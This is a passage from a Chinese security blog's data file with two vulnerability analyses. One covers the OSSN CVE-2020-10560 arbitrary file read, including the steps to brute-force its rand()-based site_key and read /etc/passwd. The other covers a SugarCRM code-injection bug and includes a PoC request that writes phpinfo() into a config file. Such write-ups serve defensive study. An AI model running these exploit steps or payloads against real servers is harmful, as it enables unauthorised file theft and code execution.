67a6","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Open Source Social Network（OSSN），是一款用PHP编写的社交网络软件。OSSN允许用户创建一个社交网站，帮助拥有相似专业或个人兴趣的人建立社交关系。该软件拥有约50万下载量。</p>\n<p>OSSN官网地址：</p>\n<p><a href=\"https://www.opensource-socialnetwork.org/\">https://www.opensource-socialnetwork.org/</a></p>\n<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h2><p>Open Source Social Network(OSSN)5.3之前版本中存在一处任意文件读取漏洞（CVE-2020-10560）。漏洞因OSSN生成的Site_Key强度过低从而可以遭受被暴力破解而产生，成功破解Site_Key的攻击者可以利用Site_Key构造出任意文件读取链接，通过components\\OssnComments\\ossn_com.php文件提供的文件预览接口，读取文件。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>Open Source Social Network应用可以从如下官网链接下载：</p>\n<p><a href=\"https://www.opensource-socialnetwork.org/download\">https://www.opensource-socialnetwork.org/download</a></p>\n<p>应用首页如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422115537-204ff9e2-844d-1.png\" alt=\"50d06cd2341f3f224e00c90680c04951.png\"></p>\n<p>OSSN中提供Comment功能，访问者可以对帖子进行评论，见下图:</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422115805-78240802-844d-1.png\" alt=\"7dc3d46cf96aef374ffe5a4c290aeeee.png\"></p>\n<p>评论帖子时，用户可以上传图片以及表情，如下图红框处：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422115855-9609c852-844d-1.png\" alt=\"6def8f79ff49c6d50164ecd2584b39e3.png\"></p>\n<p>当选择本地图片并上传后，将在评论中生成一个预览，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422115924-a78fc87e-844d-1.png\" alt=\"74ddff9e63efe6f222744c21fd3b5c73.png\"></p>\n<p>注意，这时还没有点击发布评论，上图图片只是上传成功后的一个预览图片。该临时图像文件存储于tmp目录并在前端呈现了预览。</p>\n<p>我们来看下这个临时图片文件是如何获取并在页面中展示的。查看一下图片链接，如下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422115956-ba4a24dc-844d-1.png\" alt=\"756fd3bdade936aa990e465e35f73696.png\"></p>\n<p>链接如下：</p>\n<p><a href=\"http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==\">http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==</a></p>\n<p>我们可以猜测出image参数对应的字符串应该是文件地址的加密形式，只有构造出正确的base64字符串，攻击者就可以读取任意文件。</p>\n<p>最重要的是，经过测试发现，访问这个链接并不需要用户登陆。任何人都可以通过这个链接直接访问我们上传的这个图片文件。</p>\n<p>接下来分析下后台代码，看看这个base64字符串是如何还原出文件路径以及如何被构造出来的</p>\n<p>上文链接对应的后台代码位于 \\components\\OssnComments\\ossn_com.php</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120030-cef58336-844d-1.png\" alt=\"9cc87cd2dd240d12ffce6b51dc20d281.png\"></p>\n<p>在ossn_com.php中case ‘staticimage’分支里，程序将请求中image参数值取出，并进行base64_decode解码。见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120057-df0c69ce-844d-1.png\" alt=\"405ee5b069a8f48aa34075675dd43791.png\"></p>\n<p>随后，对解码后的值再次base64_decode解码，然后利用ossn_string_decrypt方法解码并获取文件地址。见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120121-ed0884a4-844d-1.png\" alt=\"9f124d799644dd8379456b7bf34da041.png\"></p>\n<p>接着，通过ossn_validate_filepath方法对文件路径进行校验。见下图红框：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120159-03917424-844e-1.png\" alt=\"450366a18864663e2d312f7d5559b982.png\"></p>\n<p>ossn_validate_filepath方法如下图所示，可见该方法对目录遍历进行了过滤</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120230-1610ce9c-844e-1.png\" alt=\"771b3d4d6d708593496a6fdee488540d.png\"></p>\n<p>即使过滤了../ 我们仍然可以通过绝对路径来进行文件读取，例如直接读取/etc/passwd</p>\n<p>最后，程序利用file_get_contents方法对文件内容进行读取，并使用echo进行打印。见下图红框：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120258-26c89bde-844e-1.png\" alt=\"92a6b7bac377cefab4be10fd5a3c24b5.png\"></p>\n<p>通过阅读代码也可以验证之前的测试结果：该接口并未进行身份校验，未登录的用户依然可以通过该接口访问文件。</p>\n<p>问题又回到了如何构造加密字符串上。我们首先来看一下程序是如何解码的，位于libraries\\ossn.lib.system.php文件中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120324-36909b7a-844e-1.png\" alt=\"f27e6686c487d647ab145caa56fffc12.png\"></p>\n<p>通过上图的代码看，在解码过程中，需要用到site_key值。</p>\n<p>经过分析后发现，程序通过ossn_site_settings方法在数据库中读取site_key值，我们先来看一下存储于ossn_site_settings表中site_key值是什么，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120346-4365dc70-844e-1.png\" alt=\"5e893725ffa5b9ec4fb5de1ebb0e9392.png\"></p>\n<p>site_key值为c1a725ed，可见是一个8位数</p>\n<p>这样看来，只要破解出这个8位数的site_key，即可构造出指向任意文件路径的链接。</p>\n<p>我们接着分析这个site_key是如何生成的，生成代码位于libraries\\ossn.lib.upgrade.php文件中，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120409-516ddc64-844e-1.png\" alt=\"2323dd84d59c7e27fec7ca929f0676da.png\"></p>\n<p>通过分析上图加密过程不难发现，该8位随机数是通过如下方式产生的：</p>\n<ol>\n<li><p>以字符串“ ossn”开头。</p>\n</li>\n<li><p>通过rand方法生成一个随机数并拼接到“ ossn”字符串后。</p>\n</li>\n<li><p>计算此字符串的md5值。</p>\n</li>\n<li><p>将字符3-11取出作为site_key值。</p>\n</li>\n</ol>\n<p>本次漏洞就出在计算site_key值的第二步，也就是通过rand产生随机数这一步。</p>\n<p>关于rand方法，可以参考php官网</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120438-62894a56-844e-1.png\" alt=\"63dc236aec956222c70176bff1f7a1e0.png\"></p>\n<p>在官网介绍页面中明确的给出了警告，见上图底部</p>\n<p><strong>警告</strong></p>\n<p>此函数不会生成加密安全值，并且不应将其用于加密目的。如果需要密码安全的值，请考虑改用random_int(),random_bytes()或openssl_random_pseudo_bytes()。</p>\n<p>rand方法之所以不安全，其中一个比较重要的原因是它能产生的随机数范围有限:</p>\n<p>rand方法在没有提供可选参数 <em>min</em> 和 <em>max</em>时，返回 0 到 RAND_MAX之间的伪随机整数.</p>\n<p>在笔者的windows主机上，RAND_MAX值仅为32767</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120504-721b9578-844e-1.png\" alt=\"0b5acd2f6a7375ba756752852bc7e44a.png\"></p>\n<p>而在笔者的Linux环境中，这个值为2147483647</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120534-84486212-844e-1.png\" alt=\"6e6e0dfcc665126d10a8993caac307b3.png\"></p>\n<p>据资料显示，rand最大可能值为2,147,483,647</p>\n<p>因此，只需要生成最多20亿个rand值，将其依次带入ossn_generate_site_secret计算出对应的site_key值，这些site_key值即为所有的site_key值可能值。如果运气好，目标主机是一台windows主机，这样的操作仅仅重复3万多次即可，因为windows主机下rand产生的最大值仅为32767。</p>\n<p>在分析了弱密钥是如何生成之后，我们需要一种方法来识别生成的密钥是否有效。在临时图片文件被上传到服务器时，会被存储于ossn_data/tmp/photos文件夹中，见下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120602-94bd4eb4-844e-1.png\" alt=\"1cbb4812f7c772c5ec634b0387a39236.png\"></p>\n<p>因此上文中的加密数据成功解码后，其字符串中一定会包含tmp/photos字符串。我们这里用我们的密钥解一下上文中的编码，看一下这个推论是否正确，结果如下图：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120727-c7548450-844e-1.png\" alt=\"c06df9d005258df8bba4822aa286fb61.png\"></p>\n<p>可见成功解开的文件路径中的确存在tmp/photos字符串</p>\n<p>因此，暴力破解的思路很明朗了</p>\n<p>1、攻击者在评论里上传一个图片，不点击发送，查看此时图片临时预览链接，获取链接中image参数值。例如：<a href=\"http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==\">http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==</a>中的UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==&gt;</p>\n<p>2、将数字0-2147483647依次带入ossn_generate_site_secret中计算出对应的site_key</p>\n<p>3、依次将site_key与image值带入ossn_string_decrypt中，获取解密后的明文</p>\n<p>4、如果明文中含有tmp/photos字符串，解密成功，此时的site_key即为正确的site_key值</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>在获取site_key值后，可以通过ossn_string_encrypt方法，对想要读取的文件进行加密，通过<a href=\"http://192.167.30.119/comment/staticimage?image=\">http://192.167.30.119/comment/staticimage?image=</a>接口进行读取即可</p>\n<p>上文所涉及的工具如下：</p>\n<p>site_key计算工具</p>\n<p><a href=\"https://github.com/LucidUnicorn/CVE-2020-10560-Key-Recovery\">https://github.com/LucidUnicorn/CVE-2020-10560-Key-Recovery</a></p>\n<p>加密解密工具</p>\n<p><a href=\"https://github.com/kevthehermit/CVE-2020-10560\">https://github.com/kevthehermit/CVE-2020-10560</a></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/勒索软件Ransomware防御领域.jpg","excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Open Source Social Network（OSSN），是一款用PHP编写的社交网络软件。OSSN允许用户创建一个社交网站，帮助拥有相似专业或个人兴趣的人建立社交关系。该软件拥有约50万下载量。</p>\n<p>OSSN官网地址：</p>\n<p><a href=\"https://www.opensource-socialnetwork.org/\">https://www.opensource-socialnetwork.org/</a></p>\n<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h2><p>Open Source Social Network(OSSN)5.3之前版本中存在一处任意文件读取漏洞（CVE-2020-10560）。漏洞因OSSN生成的Site_Key强度过低从而可以遭受被暴力破解而产生，成功破解Site_Key的攻击者可以利用Site_Key构造出任意文件读取链接，通过components\\OssnComments\\ossn_com.php文件提供的文件预览接口，读取文件。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>Open Source Social Network应用可以从如下官网链接下载：</p>\n<p><a href=\"https://www.opensource-socialnetwork.org/download\">https://www.opensource-socialnetwork.org/download</a></p>\n<p>应用首页如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422115537-204ff9e2-844d-1.png\" alt=\"50d06cd2341f3f224e00c90680c04951.png\"></p>\n<p>OSSN中提供Comment功能，访问者可以对帖子进行评论，见下图:</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422115805-78240802-844d-1.png\" alt=\"7dc3d46cf96aef374ffe5a4c290aeeee.png\"></p>\n<p>评论帖子时，用户可以上传图片以及表情，如下图红框处：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422115855-9609c852-844d-1.png\" alt=\"6def8f79ff49c6d50164ecd2584b39e3.png\"></p>\n<p>当选择本地图片并上传后，将在评论中生成一个预览，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422115924-a78fc87e-844d-1.png\" alt=\"74ddff9e63efe6f222744c21fd3b5c73.png\"></p>\n<p>注意，这时还没有点击发布评论，上图图片只是上传成功后的一个预览图片。该临时图像文件存储于tmp目录并在前端呈现了预览。</p>\n<p>我们来看下这个临时图片文件是如何获取并在页面中展示的。查看一下图片链接，如下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422115956-ba4a24dc-844d-1.png\" alt=\"756fd3bdade936aa990e465e35f73696.png\"></p>\n<p>链接如下：</p>\n<p><a href=\"http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==\">http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==</a></p>\n<p>我们可以猜测出image参数对应的字符串应该是文件地址的加密形式，只有构造出正确的base64字符串，攻击者就可以读取任意文件。</p>\n<p>最重要的是，经过测试发现，访问这个链接并不需要用户登陆。任何人都可以通过这个链接直接访问我们上传的这个图片文件。</p>\n<p>接下来分析下后台代码，看看这个base64字符串是如何还原出文件路径以及如何被构造出来的</p>\n<p>上文链接对应的后台代码位于 \\components\\OssnComments\\ossn_com.php</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120030-cef58336-844d-1.png\" alt=\"9cc87cd2dd240d12ffce6b51dc20d281.png\"></p>\n<p>在ossn_com.php中case ‘staticimage’分支里，程序将请求中image参数值取出，并进行base64_decode解码。见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120057-df0c69ce-844d-1.png\" alt=\"405ee5b069a8f48aa34075675dd43791.png\"></p>\n<p>随后，对解码后的值再次base64_decode解码，然后利用ossn_string_decrypt方法解码并获取文件地址。见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120121-ed0884a4-844d-1.png\" alt=\"9f124d799644dd8379456b7bf34da041.png\"></p>\n<p>接着，通过ossn_validate_filepath方法对文件路径进行校验。见下图红框：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120159-03917424-844e-1.png\" alt=\"450366a18864663e2d312f7d5559b982.png\"></p>\n<p>ossn_validate_filepath方法如下图所示，可见该方法对目录遍历进行了过滤</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120230-1610ce9c-844e-1.png\" alt=\"771b3d4d6d708593496a6fdee488540d.png\"></p>\n<p>即使过滤了../ 我们仍然可以通过绝对路径来进行文件读取，例如直接读取/etc/passwd</p>\n<p>最后，程序利用file_get_contents方法对文件内容进行读取，并使用echo进行打印。见下图红框：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120258-26c89bde-844e-1.png\" alt=\"92a6b7bac377cefab4be10fd5a3c24b5.png\"></p>\n<p>通过阅读代码也可以验证之前的测试结果：该接口并未进行身份校验，未登录的用户依然可以通过该接口访问文件。</p>\n<p>问题又回到了如何构造加密字符串上。我们首先来看一下程序是如何解码的，位于libraries\\ossn.lib.system.php文件中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120324-36909b7a-844e-1.png\" alt=\"f27e6686c487d647ab145caa56fffc12.png\"></p>\n<p>通过上图的代码看，在解码过程中，需要用到site_key值。</p>\n<p>经过分析后发现，程序通过ossn_site_settings方法在数据库中读取site_key值，我们先来看一下存储于ossn_site_settings表中site_key值是什么，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120346-4365dc70-844e-1.png\" alt=\"5e893725ffa5b9ec4fb5de1ebb0e9392.png\"></p>\n<p>site_key值为c1a725ed，可见是一个8位数</p>\n<p>这样看来，只要破解出这个8位数的site_key，即可构造出指向任意文件路径的链接。</p>\n<p>我们接着分析这个site_key是如何生成的，生成代码位于libraries\\ossn.lib.upgrade.php文件中，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120409-516ddc64-844e-1.png\" alt=\"2323dd84d59c7e27fec7ca929f0676da.png\"></p>\n<p>通过分析上图加密过程不难发现，该8位随机数是通过如下方式产生的：</p>\n<ol>\n<li><p>以字符串“ ossn”开头。</p>\n</li>\n<li><p>通过rand方法生成一个随机数并拼接到“ ossn”字符串后。</p>\n</li>\n<li><p>计算此字符串的md5值。</p>\n</li>\n<li><p>将字符3-11取出作为site_key值。</p>\n</li>\n</ol>\n<p>本次漏洞就出在计算site_key值的第二步，也就是通过rand产生随机数这一步。</p>\n<p>关于rand方法，可以参考php官网</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120438-62894a56-844e-1.png\" alt=\"63dc236aec956222c70176bff1f7a1e0.png\"></p>\n<p>在官网介绍页面中明确的给出了警告，见上图底部</p>\n<p><strong>警告</strong></p>\n<p>此函数不会生成加密安全值，并且不应将其用于加密目的。如果需要密码安全的值，请考虑改用random_int(),random_bytes()或openssl_random_pseudo_bytes()。</p>\n<p>rand方法之所以不安全，其中一个比较重要的原因是它能产生的随机数范围有限:</p>\n<p>rand方法在没有提供可选参数 <em>min</em> 和 <em>max</em>时，返回 0 到 RAND_MAX之间的伪随机整数.</p>\n<p>在笔者的windows主机上，RAND_MAX值仅为32767</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120504-721b9578-844e-1.png\" alt=\"0b5acd2f6a7375ba756752852bc7e44a.png\"></p>\n<p>而在笔者的Linux环境中，这个值为2147483647</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120534-84486212-844e-1.png\" alt=\"6e6e0dfcc665126d10a8993caac307b3.png\"></p>\n<p>据资料显示，rand最大可能值为2,147,483,647</p>\n<p>因此，只需要生成最多20亿个rand值，将其依次带入ossn_generate_site_secret计算出对应的site_key值，这些site_key值即为所有的site_key值可能值。如果运气好，目标主机是一台windows主机，这样的操作仅仅重复3万多次即可，因为windows主机下rand产生的最大值仅为32767。</p>\n<p>在分析了弱密钥是如何生成之后，我们需要一种方法来识别生成的密钥是否有效。在临时图片文件被上传到服务器时，会被存储于ossn_data/tmp/photos文件夹中，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120602-94bd4eb4-844e-1.png\" alt=\"1cbb4812f7c772c5ec634b0387a39236.png\"></p>\n<p>因此上文中的加密数据成功解码后，其字符串中一定会包含tmp/photos字符串。我们这里用我们的密钥解一下上文中的编码，看一下这个推论是否正确，结果如下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200422120727-c7548450-844e-1.png\" alt=\"c06df9d005258df8bba4822aa286fb61.png\"></p>\n<p>可见成功解开的文件路径中的确存在tmp/photos字符串</p>\n<p>因此，暴力破解的思路很明朗了</p>\n<p>1、攻击者在评论里上传一个图片，不点击发送，查看此时图片临时预览链接，获取链接中image参数值。例如：<a href=\"http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==\">http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==</a>中的UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==&gt;</p>\n<p>2、将数字0-2147483647依次带入ossn_generate_site_secret中计算出对应的site_key</p>\n<p>3、依次将site_key与image值带入ossn_string_decrypt中，获取解密后的明文</p>\n<p>4、如果明文中含有tmp/photos字符串，解密成功，此时的site_key即为正确的site_key值</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>在获取site_key值后，可以通过ossn_string_encrypt方法，对想要读取的文件进行加密，通过<a href=\"http://192.167.30.119/comment/staticimage?image=\">http://192.167.30.119/comment/staticimage?image=</a>接口进行读取即可</p>\n<p>上文所涉及的工具如下：</p>\n<p>site_key计算工具</p>\n<p><a href=\"https://github.com/LucidUnicorn/CVE-2020-10560-Key-Recovery\">https://github.com/LucidUnicorn/CVE-2020-10560-Key-Recovery</a></p>\n<p>加密解密工具</p>\n<p><a href=\"https://github.com/kevthehermit/CVE-2020-10560\">https://github.com/kevthehermit/CVE-2020-10560</a></p>\n"},{"title":"PHP漏洞跟踪报告","date":"2017-11-01T06:30:10.000Z","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n由于SugarCRM 6.5.18系统没有对提交的url参数进行过滤，攻击者可以提价一个构造好的url参数，从而将恶意代码写入网站目录中的配置文件中去，配置文件进一步被其他文件包含，导致恶意代码被触发。\n\n<!--more-->[![php1](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP1-300x187.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP1.jpg)\n\n## 修补情况\n\n**SugarCRM ****新版本中被修复**。\n\n## 参考资料\n\nhttp://seclists.org/fulldisclosure/2016/Jun/51\n\n## 技术细节\n\n现在已知的POC如下图所示：\n\n执行POC，我们可以看到这样的结果\n\n[![php2](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP2-300x21.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP2.jpg)\n\n执行POC，我们可以看到这样的结果\n\n[![php3](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP3-300x212.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP3.jpg)\n\n下面我们就要通过poc去分析漏洞的形成原因。\n\n找到文件\\modules\\Connectors\\controller.php\n\n[![php4](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP4-300x114.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP4.jpg)\n\n<pre class=\"lang:default decode:true \">$source = SourceFactory::getSource($source_id); 这里动态调用了函数getSource()</pre>\n\n我们来看看getSource()函数\n\n[![php5](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP5-300x267.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP5.jpg)\n\ngetSource()函数在这里包含了\\include\\connectors\\sources\\default\\source.php\n\n我们回头继续看controller.php\n\n[![php6](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP6-300x47.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP6.jpg)\n\n这里用了个foreach进行遍历，将$_REQUEST提交上来的键名赋值给$name变量、键值赋值给$value变量，然后在判断键名中是否有符合正则表达式\"/^{$source_id}_(.*?)$/\"的匹配内容，并且将匹配值赋值给$matches变量。\n\n我们来看一下poc提交的所有参数\n\n<pre class=\"lang:default decode:true \">module=Connectors&amp;action=RunTest&amp;source_id=ext_rest_insideview&amp;ext_rest_insideview_[%27.phpinfo().%27]=1\n这里参数&amp;source_id值为ext_rest_insideview\n经过匹配，最后的结果为：\n$properties[“[%27.phpinfo().%27]”] = “1”;\n</pre>\n\n接下来看下一条语句\n\n<pre class=\"lang:default decode:true \">$source-&gt;setProperties($properties);\nSet Properties()函数在\\include\\connectors\\sources\\default\\source.php文件中\n</pre>\n\n[![php7](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP7-300x68.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP7.jpg)\n\n<pre class=\"lang:default decode:true \">这里把$properties数组赋给$this-&gt;_config['properties']，这里相当于生成了一个二维数组。\n并且$this-&gt;_config['encrypt_properties'] =true\n</pre>\n\n然后再看下一行代码\n\n<pre class=\"lang:default decode:true \">$source-&gt;saveConfig();</pre>\n\nsaveConfig()函数同样也在在\\include\\connectors\\sources\\default\\source.php文件中：\n\n[![php8](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP8-300x170.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP8.jpg)\n\n我们看一下红框里的代码：这里调用了override_value_to_string_recursive2()函数进行拼接字符串，接下来我们看一下override_value_to_string_recursive2()函数。\n\noverride_value_to_string_recursive2()函数位于/include/utils/array_utils.php文件中\n\n[![php9](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP9-300x106.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP9.jpg)\n\n经过函数处理，最后输出的值应该为$config['properties'][''][''.phpinfo().''] = '1';\n\n然后被写入custom/modules/Connectors/connectors/sources/{$dir}/config.php文件中去。\n\n整体流程下来，我们大概了解了poc的构造原理，也明白了漏洞触发的原因，那么我们再看一下poc\n\n[![php10](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP10-300x23.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP10.jpg)\n\n这里面的source_id的值即“ext_rest_insideview”字符串貌似没有什么作用啊，看起来只是让source_id的值的后面的变量名前半部分一样就好了。我尝试替换下试试。\n\n[![php11](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP11-300x13.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP11.jpg)\n\n但是不能触发漏洞，结果如下图\n\n[![php12](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP12-300x101.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP12.jpg)\n\n发现SourceFactory.php的61行出现错误，我们看一下getSource()中的内容：\n\n[![php13](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP13-300x122.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP13.jpg)\n\n看来是load函数出现问题了，load()函数位于include/connectors/ConnectorFactory.php中\n\n[![php14](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP14-300x151.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP14.jpg)\n\n可见load()函数调用了loadclass()函数，根据报出的错误猜测是loadclass()函数没有包含到相应的文件。\n\n我们看一下三条if语句中要包含的文件：\n\n<pre class=\"lang:default decode:true \">custom/modules/Connectors/connectors/{$type}/{$dir}/$file\nmodules/Connectors/connectors/{$type}/{$dir}/$file  \nconnectors/{$type}/{$dir}/$file \n</pre>\n\n在这里，$type参数是固定的，即是SourceFactory.php传入的’sources’\n\n[![php15](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP15-300x80.jpg)](http://blog.nsfocus.net/wp-content/uploads/2016/11/PHP15.jpg)\n\n$dir参数就是用get传入的source_id拼接的，例如source_id = “a_b_c”， $dir = 